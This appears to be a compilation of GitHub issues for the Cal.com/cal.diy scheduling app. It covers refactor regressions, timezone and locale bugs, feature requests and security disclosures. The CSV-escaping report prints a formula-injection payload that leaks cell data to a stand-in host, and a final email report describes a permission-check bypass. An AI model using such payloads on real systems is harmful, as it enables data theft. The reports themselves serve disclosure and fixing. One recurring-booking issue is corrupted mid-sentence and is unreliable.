### Issue Summary

PR #29724 (`refactor(app-store): move credential query to repository pattern`, merged 2026-07-06) moved the credential query out of `getLocationGroupedOptions` into `PrismaCredentialRepository.findNonDelegationCredentialsByAppCategories`. The moved query itself is byte-for-byte identical, but the move also relocated the call to `buildNonDelegationCredentials`, the helper that forces `delegatedTo`, `delegatedToId`, and `delegationCredentialId` to `null` on every returned credential.

Before the PR, that nulling ran only in the non-user branch of `getLocationGroupedOptions`. The repository method now applies it before the branch, so the user branch also receives credentials with those three fields overwritten to `null`. This is a silent behavior change inside a refactor whose intent reads as behavior-preserving.

There is no user-visible impact today (see Actual Results), so this is a latent correctness issue, not an incident.

### Steps to Reproduce

This is a static, code-level trace at current `main` (038381aeca); no runtime setup is needed:

1. `getLocationGroupedOptions` fetches credentials through the new repository: `packages/app-store/server.ts:64-68`.
2. The repository method applies the nulling helper unconditionally before returning: `packages/app-store/repositories/PrismaCredentialRepository.ts:38` (`return buildNonDelegationCredentials(credentials);`), and the helper overwrites the stored values with `null`: `packages/lib/delegationCredential.ts:24-26`.
3. Both branches then consume the already-nulled rows: the user branch passes them into `enrichUserWithDelegationConferencingCredentialsWithoutOrgId` (`packages/app-store/server.ts:71`, `:77`), and the non-user branch uses them directly (`packages/app-store/server.ts:83`).
4. Compare the pre-merge state at `f3284f581f` (parent of the squash commit): the query ran inline and `buildNonDelegationCredentials` was applied only on the non-user path; the user path received the rows as stored.

### Actual Results

On the user path, every credential reaching the enrich step has `delegatedTo: null`, `delegatedToId: null`, and `delegationCredentialId: null`, regardless of the real database values.

Today this is unobservable: `enrichUserWithDelegationConferencingCredentialsWithoutOrgId` is the Community Edition identity stub (`packages/app-store/delegationCredential.ts:95-99`, `return user;`) and nothing downstream on this path reads those fields. If a real implementation ever lands (EE override or upstream sync) and reads `delegationCredentialId` off incoming rows, every user-path credential would silently present `null`.

### Expected Results

A repository-pattern refactor preserves per-branch behavior: the user path receives the delegation fields as stored, as it did before the PR.

### Technical details

- Verified against `main` at `038381aeca`. All four cited files are byte-identical to the merge state of `ca90ca2c94`; no commits have touched them since the merge.
- Searched existing issues and PRs for coverage of this (`delegationCredentialId`, `buildNonDelegationCredentials`, `getLocationGroupedOptions`, `PrismaCredentialRepository`, `29724`); nothing covers it. #29811 and #29812 hit the same keyword but concern booking references on reschedule, which is unrelated.
- Static code issue, no browser or runtime environment involved, so no screen recording applies; the evidence is the line citations below.

### Evidence

The three load-bearing lines, quoted from current `main`:

`packages/app-store/repositories/PrismaCredentialRepository.ts:38`
```ts
return buildNonDelegationCredentials(credentials);
```

`packages/lib/delegationCredential.ts:24-26`
```ts
delegatedTo: null,
delegatedToId: null,
delegationCredentialId: null,
```

`packages/app-store/server.ts:71, :77, :83` — `if (user) {` opens the user branch, which passes `credentials: nonDelegationCredentials,` into the enrich call; the non-user branch assigns `credentials = nonDelegationCredentials;`.

### Suggested guards

Two cheap ones, either or both:

- a doc comment on `findNonDelegationCredentialsByAppCategories` stating that it nulls delegation fields for all callers;
- a regression test pinning the delta: assert the credentials array passed to the enrich function has `delegationCredentialId: null` even when the database row's value is non-null. It would fail pre-refactor, documenting the widening as intentional if that is the team's read.

Happy to send a PR for either or both if the team thinks this is worth fixing.

This surfaced in a post-merge review I ran with a cross-file review tool I have been building, and I re-verified the full trace by hand against current `main` before filing.

The returned 1200x630 PNG contains the title and the "Meet ..." line, but no logo and no avatar. The container log shows exactly what happened: ``` Invalid value "350" for "width". Expected a number, "auto", or a percentage value (e.g. "50%"). Invalid value "160" for "height". Expected a number, "auto", or a percentage value (e.g. "50%"). Invalid value "160" for "width". Expected a number, "auto", or a percentage value (e.g. "50%"). ``` Worth noting for anyone debugging this: the avatar separator still renders, because `Meeting` only checks whether `avatars.length > 0` and not whether the images actually drew. The result is a card with a lone `/` floating where the avatars should be, which looks like a data problem rather than a rendering one. That is what sent us looking at our avatar endpoint first. It returns HTTP 200 with a valid 384x384 PNG and is reachable from inside the container, so the images were never the issue. ## Root cause `packages/lib/OgImages.tsx`: ```ts const OG_ASSETS = { meeting: { ..., logoWidth: "350", avatarSize: "160", ... }, app: { ..., logoWidth: "150", iconSize: "172", ... }, generic: { ..., logoWidth: "350", ... }, }; ``` These are passed straight through to Satori: ``` 208: 221: width={config.avatarSize} 222: height={config.avatarSize} 302: width={config.logoWidth} 314: width={config.iconSize} 315: height={config.iconSize} 343: ``` Satori accepts a number, `"auto"`, or a percentage. A bare numeric string such as `"350"` is none of those, so the element is skipped. ## Suggested fix Make the values numbers: ```diff meeting: { id: "meeting-og-image-v1", logo: LOGO, - logoWidth: "350", - avatarSize: "160", + logoWidth: 350, + avatarSize: 160, variant: "dark" as const, }, app: { id: "app-og-image-v1", logo: LOGO, - logoWidth: "150", - iconSize: "172", + logoWidth: 150, + iconSize: 172, variant: "light" as const, }, generic: { id: "generic-og-image-v1", logo: LOGO_DARK, - logoWidth: "350", + logoWidth: 350, variant: "light" as const, }, ``` `"350px"` would work too, but numbers keep the template literal on line 227 (`w-[${config.avatarSize}px]`) correct without further changes. Two things that may be useful when merging: - `getOGImageVersion` hashes `OG_ASSETS`, so this change alters the version hash on its own and previously cached images are invalidated. The `id` fields do not need a manual bump for cache busting, though bumping them is harmless. - A regression test would need to assert on the rendered output rather than on a 200 response. The endpoint returns a perfectly valid PNG today; it is just missing two elements. ## Environment - cal.diy 6.2.0, self-hosted, Docker, built from the official Dockerfile - `@vercel/og` 0.6.3 - Node runtime, `/api/social/og/image` on the Edge Runtime ## Disclosure We have not built and verified this patch on our own instance. We run a pinned commit and worked around the problem outside the application, so the diff above follows from the error message and the accepted value list rather than from a green build. Happy to open a PR if that is preferred.

## Problem

All-day events on a connected calendar consume availability, even when:

- the event is explicitly marked `TRANSP:TRANSPARENT` / "Show as: Free" in Google Calendar, or
- the user simply doesn't want multi-day context markers, background blocks, or holiday-style indicators to affect bookable time.

The only workaround today is to move such events to a separate sub-calendar and uncheck it under Settings → Calendars → check for conflicts. That's fragile — every new all-day event has to remember the right sub-calendar — and it costs genuine conflict detection for everything else on that calendar.

## Proposal

A single **Ignore all-day events** setting, at two levels:

1. **Global default** — `Settings → Calendars` → toggle `Ignore all-day events in availability checks` (default: off, no behaviour change)
2. **Per event-type override** — `Event Type → Limits` → dropdown `Ignore all-day events`: *Use global* / *Always ignore* / *Always include*

When enabled, skip events identified as all-day:

| provider | signal |
|---|---|
| Google | `start.date && !start.dateTime` |
| Microsoft Graph | `isAllDay === true` |
| CalDAV / ICS | `DTSTART;VALUE=DATE` |

## Why the per-event-type override matters

A 15-minute intro call can safely ignore an all-day context marker — being tagged "team offsite week" doesn't prevent a short call. A half-day workshop should still respect it. A single global setting breaks one of those two cases.

## Proposed UI

**Settings → Calendars**

- ☐ Ignore all-day events in availability checks *(default: off)*

**Event Types → [Event] → Limits**

- Ignore all-day events: `[ Use global default ▾ ]` — *Use global* / *Always ignore* / *Always include*

## Acceptance criteria

- [ ] Global toggle in `Settings → Calendars` sets the default
- [ ] Per-event-type dropdown overrides the global value per booking link
- [ ] Applies to Google Calendar, Microsoft 365 / Outlook, CalDAV (incl. Apple), and ICS feeds
- [ ] No behaviour change when the toggle is off
- [ ] Documented in cal.com/help

## Relationship to the CalDAV bug

This is deliberately separate from #29869 (unanswered all-day invitations block the whole day). That is a correctness problem — events the user never accepted should not block regardless of settings. This request is about user preference for all-day events generally, including ones the user created themselves. Fixing the bug does not remove the need for this option, and vice versa.

## Related issues

- #21625 — O365 all-day "Free" event blocks the entire day
- #2240 — Calendar availability incorrect with all-day events
- #2236 — Events with `availability:free` still block booking
- #8918 — Support blocking holiday calendars (inverse case)
- #13090 — Handling of "Out of Office" events
- #29410 — earlier version of this request

## Environment

- Instance: cal.eu (EU-hosted)
- Plan: Individuals (free)
- Connected calendars: Apple Calendar (CalDAV), Google Calendar, Microsoft 365

### Issue Summary

`formatOffset()` in `packages/lib/timezone.ts` strips the leading zero from an hour offset, but its regex only matches offsets whose minutes are exactly `:00`:

```ts
const formatOffset = (offset: string) =>
  offset.replace(/^([-+])(0)(\d):00$/, (_, sign, _zero, hour) => `${sign}${hour}:00`);
```

So whole-hour zones are normalised while half-hour and quarter-hour zones keep their padding, and the timezone dropdown shows two different formats side by side.

### Actual results

```
Asia/Kolkata         raw +05:30  ->  +05:30     <- padded
Asia/Kathmandu       raw +05:45  ->  +05:45     <- padded
Australia/Adelaide   raw +09:30  ->  +09:30     <- padded
Pacific/Chatham      raw +12:45  ->  +12:45     <- padded
Europe/London        raw +01:00  ->  +1:00
Asia/Seoul           raw +09:00  ->  +9:00
America/New_York     raw -04:00  ->  -4:00
```

In `handleOptionLabel` that becomes:

```
Berlin GMT +1:00
Kolkata GMT +05:30      <- inconsistent
Kathmandu GMT +05:45    <- inconsistent
Seoul GMT +9:00
```

`Asia/Kolkata` is already in the test fixture in `apps/web/test/lib/getTimezone.test.ts`, so this affects a timezone the suite knows about — India, Nepal, Sri Lanka, Iran, Myanmar, parts of Australia, the Chatham Islands and Newfoundland all land in the padded branch. That's on the order of 1.5 billion people seeing a differently formatted offset from everyone else.

Existing snapshots pin the unpadded form for whole hours (`"San Francisco GMT -8:00"`), so the unpadded style is the intended one.

### Expected results

One format for every zone — the leading zero dropped regardless of the minutes:

```
Kolkata GMT +5:30
Kathmandu GMT +5:45
Seoul GMT +9:00
```

### Reproduction

```js
const formatOffset = (offset) =>
  offset.replace(/^([-+])(0)(\d):00$/, (_, sign, _zero, hour) => `${sign}${hour}:00`);

formatOffset("+09:00"); // "+9:00"
formatOffset("+05:30"); // "+05:30"  ← unchanged
```

`packages/lib/timezone.ts` has no test file of its own; `handleOptionLabel` is covered only through `America/Los_Angeles`, a whole-hour zone, in `apps/web/test/lib/getTimezone.test.ts`.

I have a fix ready and will open a PR referencing this issue.

### Issue Summary

`validateIntervalLimitOrder()` in `packages/lib/intervalLimits/validateIntervalLimitOrder.ts` sorts the limits by value and then checks that the resulting key order matches `PER_DAY → PER_WEEK → PER_MONTH → PER_YEAR`:

```ts
export const validateIntervalLimitOrder = (input: IntervalLimit) => {
  const sorted = Object.entries(input)
    .sort(([, value], [, valuetwo]) => value - valuetwo)
    .map(([key]) => key);

  const validationOrderWithoutMissing = ascendingLimitKeys.filter((key) => sorted.includes(key));

  return sorted.every((key, index) => validationOrderWithoutMissing[index] === key);
};
```

When two limits have **equal values** the comparator returns `0`. `Array.prototype.sort` is stable, so the tie is broken by the object's own key insertion order — and the function's verdict then depends on the order the keys happen to sit in the object, not on the limits themselves.

```js
validateIntervalLimitOrder({ PER_DAY: 2, PER_WEEK: 2 });  // true
validateIntervalLimitOrder({ PER_WEEK: 2, PER_DAY: 2 });  // false  ← same limits
```

Equal limits are legitimate — "at most 5 bookings per day and at most 5 per week" is a coherent configuration, and the existing test suite already asserts `validateIntervalLimitOrder({ PER_DAY: 1, PER_YEAR: 1 })` is `true` (`apps/web/test/lib/checkBookingLimits.test.ts:114`). That test only passes because of the key order the literal was written in.

### Reachable from the UI

`IntervalLimitsManager` in `packages/features/eventtypes/components/tabs/limits/EventLimitsTab.tsx` re-inserts a key at the **end** of the object whenever the user changes a row's unit:

```ts
delete current[limitKey];
const newData = { ...current, [interval?.value as IntervalLimitsKey]: currentValue };
```

So a user who flips a row's unit and flips it back ends up with the same limits in a different key order:

```
start         {"PER_DAY":5,"PER_WEEK":5}     valid = true
day -> month  {"PER_WEEK":5,"PER_MONTH":5}   valid = true
month -> day  {"PER_WEEK":5,"PER_DAY":5}     valid = false   ← identical limits to start
```

The list is rendered sorted by `ascendingLimitKeys`, so **the form looks exactly the same as it did at the start** — same two rows, same numbers, same order — but saving now fails.

### Actual results

`packages/trpc/server/routers/viewer/eventTypes/heavy/update.handler.ts` rejects the save:

```
TRPCError BAD_REQUEST: "Booking limits must be in ascending order."
```

(and the equivalent for `durationLimits`). The message is misleading — the limits *are* in ascending order, they're equal. The same check also runs client-side in `packages/platform/atoms/event-types/hooks/useEventTypeForm.ts`.

Worst case, all four equal:

```js
validateIntervalLimitOrder({ PER_DAY: 1, PER_YEAR: 1, PER_WEEK: 1, PER_MONTH: 1 }); // false
```

### Expected results

The verdict depends only on the limit values, not on key insertion order. Equal adjacent limits are accepted — a smaller unit may not have a *larger* limit than a bigger unit, but it may have the same one.

### Reproduction

```js
const ascendingLimitKeys = ["PER_DAY", "PER_WEEK", "PER_MONTH", "PER_YEAR"];
const validateIntervalLimitOrder = (input) => {
  const sorted = Object.entries(input).sort(([, a], [, b]) => a - b).map(([k]) => k);
  const expected = ascendingLimitKeys.filter((k) => sorted.includes(k));
  return sorted.every((k, i) => expected[i] === k);
};

validateIntervalLimitOrder({ PER_DAY: 2, PER_WEEK: 2 }); // true
validateIntervalLimitOrder({ PER_WEEK: 2, PER_DAY: 2 }); // false
```

I have a fix ready and will open a PR referencing this issue.
items.title: validateIntervalLimitOrder verdict depends on key insertion order when limits are equal

### Issue Summary

`isBrowserLocale24h()` in `packages/lib/timeFormat.ts` decides whether the user's browser prefers a 24-hour clock by formatting an hour and **checking whether the output contains the letter `M`**:

```ts
// Intl.DateTimeFormat with value=undefined uses local browser settings.
if (!!new Intl.DateTimeFormat(undefined, { hour: "numeric" }).format(0).match(/M/i)) {
  setIs24hClockInLocalStorage(false);
  return false;
} else {
  setIs24hClockInLocalStorage(true);
  return true;
}
```

That only works for locales whose AM/PM markers happen to be the Latin letters `AM`/`PM`. Locales that write their day-period in their own script contain no `M`, so they are misdetected as 24-hour — and, worse, the wrong answer is **written to localStorage**, so it sticks until the user manually changes the setting.

`Intl` already reports the answer directly via `resolvedOptions().hour12`, so no heuristic is needed.

### Actual results

Checked every locale this repo ships (`i18n.json` → `en` + 36 targets) on Node 22 / ICU 78:

```
locales checked: 37
mismatches: 3
  ar      "9 ص"      actual 12h -> detected 24h
  el      "9 π.μ."   actual 12h -> detected 24h
  zh-TW   "上午9時"    actual 12h -> detected 24h
```

Arabic, Greek and Traditional Chinese users get a 24-hour clock even though their locale is 12-hour. The same heuristic also misfires for other common browser locales that aren't in the shipped set, e.g. `ms-MY` (`"9 PG"`) and `sq-AL` (`"9 p.d."`).

Conversely the check is *coincidentally* right for `ko-KR`, whose formatted output is `"AM 9시"` — it contains a literal `AM`. So the current behaviour depends on which locales happen to romanise their day period.

### Expected results

A locale that `Intl` reports as 12-hour is detected as 12-hour, regardless of the script its AM/PM marker is written in.

### Reproduction

```js
const f = new Intl.DateTimeFormat("ar-EG", { hour: "numeric" });

f.format(0);                        // "٩ ص"  — no "M"
f.resolvedOptions().hour12;         // true   — it IS a 12-hour locale
/M/i.test(f.format(0));             // false  — so the app picks 24h
```

### Note on the fallback

`resolvedOptions().hour12` is present in every environment that supports `Intl.DateTimeFormat`, which this file already requires. `hourCycle` (`h11`/`h12`/`h23`/`h24`) is the more precise field and can back it up.

`timeFormat.ts` currently has no test file.

I have a fix ready and will open a PR referencing this issue.
items.title: isBrowserLocale24h misdetects 12-hour locales whose AM/PM marker isn't Latin (ar, el, zh-TW)

### Issue Summary

`sanitizeValue()` in `packages/lib/csvUtils.ts` — the function every CSV export runs its values through — has two escaping holes. Both are reachable with attacker-supplied text, because booking titles and attendee names come from whoever books the meeting, not from the person downloading the file.

```ts
export const sanitizeValue = (value: string) => {
  if (value.includes('"')) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  if (value.includes(",") || value.includes("\n")) {
    return `"${value}"`;
  }
  return value;
};
```

#### 1. A bare carriage return breaks the row structure

The newline check only looks for `\n`. RFC 4180 treats a lone `\r` as a record separator too, and so do real parsers. A value containing `\r` is emitted unquoted and splits the row.

Reproduced with Python's `csv` module (RFC 4180 compliant) on the exact output of `objectsToCsv`:

```
input rows: 2 data rows, 3 columns
parsed out:
  ['Booking UID', 'Title', 'Attendee name']
  ['abc', '=1+1', 'Alice']
  ['jkl', 'CR']            <- row split in half
  ['injected', 'Dan']      <- and every column after it is shifted
row count: 4   (expected 3)
```

Anyone who can set a booking title or attendee name to `foo\rbar` corrupts the org's exported spreadsheet from that row onward.

#### 2. CSV formula injection (CWE-1236)

Values beginning with `=`, `+`, `-`, `@`, tab or CR are interpreted as formulas by Excel, LibreOffice and Google Sheets. `sanitizeValue` passes them through untouched:

```
Booking UID,Title,Attendee name
abc,=1+1,Alice
def,"=HYPERLINK(""https://evil.test?d=""&A1,""Click"")",Bob
```

The second row is *quoted* — because it happens to contain a quote character — and quoting does **not** stop formula evaluation; spreadsheet apps strip the quotes first. So a booking titled `=HYPERLINK("https://evil.test?d="&A1,"Click")` becomes a clickable link in an admin's downloaded sheet that exfiltrates neighbouring cell contents.

### Where this is reachable from

- `apps/web/modules/bookings/components/BookingsCsvDownload.tsx` → `transformBookingToCsv()` puts `booking.title`, attendee names, attendee emails and `booking.location` straight into the export. **These are supplied by the person making the booking.**
- `apps/web/modules/users/lib/UserListTableUtils.ts` → the members export.

Separately, in `generateCsvRawForMembersTable()` the `email`, `role` and `${orgDomain}/${username}` columns are concatenated **without** calling `sanitizeValue` at all, while the `Teams` and attribute columns do call it. That looks unintentional given the surrounding code.

### Expected results

- A value containing `\r`, `\r\n` or `\n` is quoted, so one field stays one field.
- Values that a spreadsheet would evaluate as a formula are neutralised (the usual fix is prefixing a single quote or a tab, per OWASP).
- Every column in the members export goes through the same escaping as its neighbours.

### Reproduction

```js
const sanitizeValue = (value) => {
  if (value.includes('"')) return `"${value.replace(/"/g, '""')}"`;
  if (value.includes(",") || value.includes("\n")) return `"${value}"`;
  return value;
};

sanitizeValue("a\rb");  // "a\rb"  — not quoted, splits the row
sanitizeValue("=1+1");  // "=1+1"  — evaluated by Excel/Sheets
```

`csvUtils.ts` currently has no test file.

I have a fix ready and will open a PR referencing this issue.

## The problem

`NEXT_PUBLIC_WEBAPP_URL` / `WEBAPP_URL` has to be the public URL because it ends up in a lot of user-facing places:

- Outgoing emails and calendar `.ics` invites
- OAuth redirect URIs registered with Google, Zoom, etc.
- Booking share links, magic-link auth
- The browser JS bundle

But the same value is also used for server-side HTTP calls Cal.com makes to itself during SSR (NextAuth CSRF fetch, discovery endpoints, etc.). When the container sits behind a reverse proxy or CDN (Cloudflare Tunnel, Traefik, nginx-proxy, k8s Ingress, whatever), those internal calls go all the way out and back:

```
container -> reverse proxy / CDN -> back to the same container
```

## Why it matters

- Extra latency on every SSR render (full external round-trip for a CSRF token).
- Wasted bandwidth on both legs.
- Extra cost if the CDN/WAF is metered per-request.
- Noise in WAF audit logs. The deployment's own egress IP keeps hitting `/api/auth/csrf` and shows up as a "suspicious pattern" or "overprovisioned policy" false positive.
- Actually breaks on some providers. OVH for example doesn't hairpin NAT, so the container physically can't reach its own public IP and SSR fails with weird TLS errors.

## Reproduction

Standard Docker + reverse proxy setup, then:

```bash
CALCOM_IP=$(docker inspect calcom --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
sudo tcpdump -i any -A "src host $CALCOM_IP and dst port 443" 2>/dev/null | grep -oE 'your-public-hostname\.example\.com'
```

I see roughly 5-10 outbound TLS connections per minute to my own public hostname, `User-Agent: node`.

## What I'd like

An env var like `WEBAPP_URL_INTERNAL` that server-side code uses in place of `WEBAPP_URL` when it's set. Client-facing URL generation stays on `WEBAPP_URL`.

Basically wherever the code has:

```ts
fetch(`${WEBAPP_URL}/api/...`)
```

it becomes:

```ts
fetch(`${WEBAPP_URL_INTERNAL || WEBAPP_URL}/api/...`)
```

Operators set `WEBAPP_URL_INTERNAL=http://localhost:3000` (or the internal service name in k8s) and nothing else changes.

## Prior art

NextAuth already solved this exact class of problem with `NEXTAUTH_URL_INTERNAL`. Documented and used all over the place.

## Backwards compatibility

If the var is unset, nothing changes. Existing deployments keep working. If it's set, only server-side self-fetches change and public URLs stay identical.

## Environment

Cal.com v6.2.0. Reproduces on any deployment where the container isn't on the same network as the reverse proxy origin.

### Issue Summary

When a recurring booking occurrence is cancelled with **"cancel this and all following"** (`cancelSubsequentBookings`), and the chosen occ
urrence is **not the earliest upcoming one**, the earlier occurrences — which are **not** cancelled and still happen — have their schedule
d `MEETING_STARTED` / `MEETING_ENDED` webhook triggers and their **no-show detection tasks** silently deleted. Those meetings still take p
lace, but their time-based webhooks and no-show automations never fire.

Root cause is a scope divergence in `packages/features/bookings/lib/handleCancelBooking.ts`. The occurrences that get **cancelled** are se
lected with `startTime >= gte`, where `gte` is the target occurrence's `startTime`:

```ts
const gte = cancelSubsequentBookings ? bookingToDelete.startTime : new Date();
await bookingRepository.updateMany({
  where: { recurringEventId, startTime: { gte } },   // cancels target + later  ✅
  data: { status: BookingStatus.CANCELLED, ... },
});
```

But the follow-up fetch that drives **cleanup** hard-codes `new Date()` (and has no status filter):

```ts
const allUpdatedBookings = await bookingRepository.find
  where: { recurringEventId, startTime: { gte: new Date() } },   // ALL upcoming ❌ (superset)
});
```

`allUpdatedBookings` then drives `deleteWebhookScheduledTriggers({ booking })` + `cancelNoShowTasksForBooking({ bookingUid })` for every r
eturned booking, including the earlier, still-`ACCEPTED

### Steps to Reproduce

1. A recurring event with a `MEETING_STARTED` and/or `Mcription.
2. A series with ≥3 upcoming occurrences (all in the future), each with its scheduled webhook triggers.
3. Cancel the **middle** occurrence with "cancel this aSubsequentBookings: true`) — reachable via the API v2 can
cel endpoint and via reporting a recurring booking (`reportBooking` auto-sets `cancelSubsequentBookings` for recurring bookings).

### Actual Results

- The earliest occurrence stays `ACCEPTED` (correctly not cancelled), but its scheduled `MEETING_STARTED`/`MEETING_ENDED` webhook triggers
 and no-show tasks are deleted, so they never fire.

### Expected Results

- Only the cancelled subset (target occurrence + later)s / no-show tasks cleaned up. Earlier, non-cancelled occu
rrences keep theirs.

### Technical details

- Backend logic bug, independent of browser/Node. Reproduces on current `main`.

## Summary

When a booking is rescheduled, `EventManager.reschedule()` reloads the original
booking's references with a Prisma `select` that omits two columns:
`delegationCredentialId` and `thirdPartyRecurringEventId`. On a plain reschedule
(same host, same location — the common case) those references are copied verbatim
onto the newly-created booking, so both columns land as `NULL` on the new booking.

Because those two fields are exactly what the calendar credential/event
resolution relies on later, the rescheduled booking loses the link back to:

- the **delegation credential** that owns the calendar event
  (Google Workspace domain-wide delegation — such bookings have
  `credentialId = NULL` and `delegationCredentialId = <uuid>`), and
- the **third-party recurring event** id used when deleting an occurrence of a
  recurring series.

The next time that booking is cancelled or rescheduled, credential lookup can no
longer resolve the delegation credential and falls back to a match-by-type
heuristic, so the calendar event is deleted from the wrong account or not at all
— leaving an **orphaned/ghost event** on the organizer's calendar. The data loss
is permanent on the new booking row.

## Steps to reproduce

1. As an organizer whose calendar is connected via a **delegation credential**
   (domain-wide delegation), take a booking whose `BookingReference` has
   `credentialId = NULL`, `delegationCredentialId` set, and (for recurring
   series) `thirdPartyRecurringEventId` set.
2. Reschedule that booking to a new time (same location, same host — no
   confirmation required).
3. Inspect the `BookingReference` rows of the **new** booking.

## Actual behaviour

The new booking's references have `delegationCredentialId = NULL` and
`thirdPartyRecurringEventId = NULL`, even though the original booking's
references had them set. A subsequent cancel/reschedule then cannot resolve the
delegation credential and leaves a ghost calendar event.

## Expected behaviour

The rescheduled booking's references retain `delegationCredentialId` and
`thirdPartyRecurringEventId`, exactly as the original booking's references had
them, so future cancel/reschedule operations keep working.

## Root cause

`packages/features/bookings/lib/EventManager.ts`, inside `reschedule()`
(the `prisma.booking.findUnique` used to reload the booking being rescheduled):

```ts
// packages/features/bookings/lib/EventManager.ts (references select)
select: {
  type: true,
  uid: true,
  meetingId: true,
  meetingPassword: true,
  meetingUrl: true,
  externalCalendarId: true,
  credentialId: true,
  // delegationCredentialId + thirdPartyRecurringEventId are NOT selected
},
```

These references flow out of `reschedule()` unchanged on a plain reschedule:

```ts
// EventManager.ts
return {
  results,
  referencesToCreate: shouldUpdateBookingReferences
    ? updatedBookingReferences
    : [...booking.references], // <- carries the missing-field references forward
};
```

and are persisted onto the new booking:

```ts
// packages/features/bookings/lib/service/RegularBookingService.ts
referencesToCreate = updateManager.referencesToCreate;
// ...
await deps.prismaClient.booking.update({
  where: { uid: booking.uid },
  data: { references: { createMany: { data: referencesToCreate } } },
});
```

The dropped fields are the ones the delete path depends on
(`getCalendarCredential(credentialId, type, reference.delegationCredentialId)`
and the recurring-series id used to compute the calendar `bookingRefUid`).

**Corroboration that both fields are required:** the cancel path deliberately
selects both of them for the same purpose
(`packages/features/bookings/lib/handleCancelBooking/getBookingToDelete.ts`), and
`EventManager.cancelEvent()`'s `bookingReferences` parameter type explicitly
lists `thirdPartyRecurringEventId`.

## Fix

Add the two fields to the `references` select in `reschedule()`. Two lines.

## Evidence (failing → passing test)

A new test in
`packages/features/bookings/lib/handleNewBooking/test/reschedule.test.ts` seeds a
booking whose google-calendar reference carries both `delegationCredentialId` and
`thirdPartyRecurringEventId`, reschedules it, and asserts the new booking's
references still carry both.

Before the fix (test seeded, select unpatched):

```
❯ reschedule.test.ts (19 tests | 1 failed | 18 skipped)
  × should preserve delegationCredentialId and thirdPartyRecurringEventId on the booking references of the rescheduled booking

  - Expected: delegationCredentialId "delegation-credential-abc",
              thirdPartyRecurringEventId "third-party-recurring-xyz"
  + Received: delegationCredentialId null, thirdPartyRecurringEventId null
```

After the fix:

```
Test Files  1 passed (1)
     Tests  1 passed | 18 skipped (19)
```

Surrounding suites (handleNewBooking + service + handleSeats) remain green:
`152 passed | 1 skipped | 2 todo`.

### Is your proposal related to a problem?

Cal.diy already offers an excellent booking experience. The opportunity is to extend that experience to a new way people will increasingly use the web: asking a browser assistant to complete a task for them.

Imagine visiting a Cal.diy booking page and saying:

> “Find me a 30-minute appointment with them next Thursday afternoon. Ask me anything they need to know, then show me the booking before confirming it.”

The assistant could understand the event, check real availability, account for the user’s timezone, ask the configured booking questions, and prepare the appointment—all through Cal.diy.

### Describe the solution you'd like

Explore adding WebMCP support to public Cal.diy booking pages.

WebMCP is an emerging browser standard that lets a webpage expose a small set of structured tools to browser-based AI assistants. Instead of replacing Cal.diy’s interface, it would let the booking page explain its available actions and current state directly to the assistant.

An initial version could allow an assistant to:

- Read event details, available durations, locations, and timezone information.
- Find currently available appointment slots.
- Understand required and optional booking questions.
- Ask the user those questions conversationally.
- Support custom fields, additional guests, recurring events, seats, rescheduling, and events requiring host confirmation.
- Prepare the complete booking and display a summary.
- Wait for explicit user approval before creating or rescheduling anything.

For example:

> “I found a 30-minute slot on Thursday at 3:00 PM in your timezone. The host would like to know what you want to discuss and which company you represent. Would you like me to prepare this appointment?”

This could make Cal.diy booking links feel native inside the next generation of browser assistants while keeping users visibly in control.

At a high level, the public booking page could register an optional WebMCP adapter that describes the event, booking questions, and currently available slots. The adapter would call the existing Cal.diy form validation and booking flow, with preparation and final confirmation kept as separate steps.

### Describe alternatives you've considered

The wider Cal ecosystem already provides a hosted MCP server that wraps the Cal.com API and supports account-level operations such as managing bookings, event types, and schedules. That is an important and powerful integration.

WebMCP would complement the existing MCP approach rather than replace it:

- MCP provides an authenticated, service-level connection to Cal.
- WebMCP provides a contextual connection to the public booking page currently open in the user’s browser.

Browser assistants can also interact with pages by visually clicking buttons and filling fields. That should remain a useful fallback, but WebMCP would let Cal.diy provide richer scheduling context—such as exact availability, booking-question schemas, timezones, recurrence options, and confirmation boundaries—directly from the application.

### Additional context

WebMCP is currently experimental and moving through Chrome’s origin-trial process. Google has announced that Gemini in Chrome will support WebMCP, although no public release date has been given yet.

The integration could be introduced as a progressive enhancement. Browsers and Cal.diy installations without WebMCP enabled would continue using the existing booking experience unchanged.

A local proof of concept has already been created to explore the idea. It suggests that the feature can build on Cal.diy’s existing booking page and validation flow rather than requiring a separate booking system. This issue is intended to ask whether the concept fits Cal.diy’s direction before proposing implementation work.

Paid events could deliberately remain outside the initial scope. One question for a later discussion would be whether paid bookings should continue through the visible checkout experience or eventually integrate with agentic-commerce standards such as Google’s Universal Commerce Protocol or AP2.

### Requirement/Document

- [[Chrome WebMCP documentation](https://developer.chrome.com/docs/ai/webmcp)](https://developer.chrome.com/docs/ai/webmcp)
- [[Google’s WebMCP and Gemini in Chrome announcement](https://developer.chrome.com/blog/chrome-at-io26)](https://developer.chrome.com/blog/chrome-at-io26)
- [[WebMCP specification and explainer](https://github.com/webmachinelearning/webmcp)](https://github.com/webmachinelearning/webmcp)
- [[Cal.com’s existing MCP server](https://cal.com/docs/mcp-server)](https://cal.com/docs/mcp-server)
- [[Google Universal Commerce Protocol](https://developers.google.com/merchant/ucp)](https://developers.google.com/merchant/ucp)

reported via email on 13 June 2026 

 am reporting a systemic authorization issue, confirmed against the verbatim BookingAccessService, with an honest provenance caveat below.

In the public main tree (commit 4026669, stub from PR #28903), the PBAC layer is inlined no-op stubs: `PermissionCheckService.checkPermission/hasPermission` return `true` and `getResourcePermissions` returns all-true, duplicated across 15 files. The `@calcom/features/pbac/services/permission-check.service` exists only in test mocks (zero non-test imports), and there is no alias/swap in next.config/tsconfig/package.json. These stubs back `createTeamPbacProcedure`/`createOrgPbacProcedure` (pbacProcedures.ts) and `doesUserIdHaveAccessToBooking` (BookingAccessService.ts, also the v2 booking-pbac.guard). Migration 20260129090913_enable_pbac_globally enables PBAC by default, so the stub is the live path.

What I observed: running the verbatim BookingAccessService with only external imports faked, attacker user 42 (not organizer, not host, not a member of team 999) got `doesUserIdHaveAccessToBooking => true` for a team booking.

POC: 
```
attacker (member of no relevant team) calls a team-event booking action (confirm/reject/details/history)
-> doesUserIdHaveAccessToBooking(attacker) returns true -> action allowed
```

Validated by copying `BookingAccessService.ts`, replacing only its 4 external import lines with type-compatible fakes (`MembershipRole`, `UserRepository`, a `BookingRepository` returning a fixture, type-only `PrismaClient`) and leaving the class body byte-for-byte verbatim (the `checkPermission(..._args) { return true; }` and Case-3 block unchanged), transpiled with esbuild on Node 18:

```
